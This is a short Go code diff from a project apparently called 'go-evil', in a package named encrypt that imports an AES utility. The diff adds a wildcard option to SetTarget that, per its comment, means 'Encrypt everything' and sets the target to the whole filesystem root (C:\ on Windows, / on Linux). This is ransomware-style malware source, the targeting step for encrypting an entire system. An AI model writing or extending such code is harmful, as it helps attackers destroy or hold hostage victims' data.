@@ -3,6 +3,7 @@ package encrypt
 import (
 	"bufio"
 	"os"
+	"runtime"
 	"strings"
 
 	enc_aes "github.com/s9rA16Bf4/go-evil/utility/algorithm/encryption/aes"
@@ -24,6 +25,16 @@ type target_t struct {
 var c_target target_t
 
 func SetTarget(path string) { // Either a file or a folder
+	if path == "*" { // Encrypt everything
+		c_target.target_type = "dir"
+		if runtime.GOOS == "windows" {
+			c_target.target_name = "C:\\" // Windows root
+		} else {
+			c_target.target_name = "/" // Linux root
+		}
+		return
+	}
+
 	info, err := os.Stat(path)
 	if err != nil { // The target didn't exist
 		notify.Error(err.Error(), "attack_vector.SetTarget()")
